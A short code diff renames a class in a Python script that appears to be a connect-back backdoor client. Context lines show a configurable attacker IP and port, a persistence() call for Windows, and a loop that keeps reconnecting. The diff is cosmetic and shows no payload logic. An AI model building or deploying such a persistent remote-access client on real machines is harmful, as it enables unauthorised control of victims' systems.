@@ -16,7 +16,7 @@ IP = "localhost".encode('utf-8')  # change this
 PORT = 4445  # change this (Integer Only)
 
 
-class MotherFucker():
+class Server():
     def __init__(self, ip, port):
         self.persistence()    # Uncomment for windows
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -117,7 +117,7 @@ def get_status():
 while True:
     try:
         if get_status():
-            jja213415 = MotherFucker(IP, PORT)
+            jja213415 = Server(IP, PORT)
             jja213415.run()
     except Exception as e:
         print(e)
